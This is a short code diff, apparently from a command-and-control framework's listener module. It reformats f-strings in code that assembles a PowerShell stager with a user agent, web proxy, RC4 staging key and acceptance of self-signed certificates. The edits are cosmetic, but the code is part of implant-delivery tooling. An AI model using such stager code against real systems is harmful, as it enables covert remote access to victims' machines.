@@ -132,7 +132,7 @@ class Listener:
             if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
-            stager += f"$u='{ user_agent }';"
+            stager += f"$u='{user_agent}';"
 
             if "https" in host:
                 # allow for self-signed certificates for https connections
@@ -148,9 +148,7 @@ class Listener:
 
                     else:
                         # TODO: implement form for other proxy
-                        stager += (
-                            f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');"
-                        )
+                        stager += f"$proxy=New-Object Net.WebProxy('{proxy.lower()}');"
                         stager += "$wc.Proxy = $proxy;"
 
                     if proxy_creds.lower() == "default":
@@ -186,7 +184,7 @@ class Listener:
                     host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
 
             # code to turn the key string into a byte array
-            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
+            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
 
             # this is the minimized RC4 stager code from rc4.ps1
             stager += listener_util.powershell_rc4()
